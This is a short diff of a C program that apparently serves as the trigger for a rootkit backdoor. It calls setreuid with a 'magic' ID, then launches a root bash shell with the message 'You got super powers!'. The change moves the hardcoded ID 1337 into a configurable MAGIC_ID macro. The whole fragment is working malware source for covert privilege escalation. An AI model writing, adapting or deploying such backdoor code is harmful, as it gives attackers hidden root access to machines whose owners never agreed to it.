@@ -10,6 +10,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include "config.h"
 
 int main(int argc, char *argv[])
 {
@@ -20,7 +21,7 @@ int main(int argc, char *argv[])
 	if(geteuid() == 0){
 		printf("You are already root! :)\n\n");
 		exit(0);
-	} else if (setreuid(1337, 1337) == 0){
+	} else if (setreuid(MAGIC_ID, MAGIC_ID) == 0){
 		printf("\e[01;36mYou got super powers!\e[00m\n\n");
 		execve(bash, arg, envp);
 	} else {
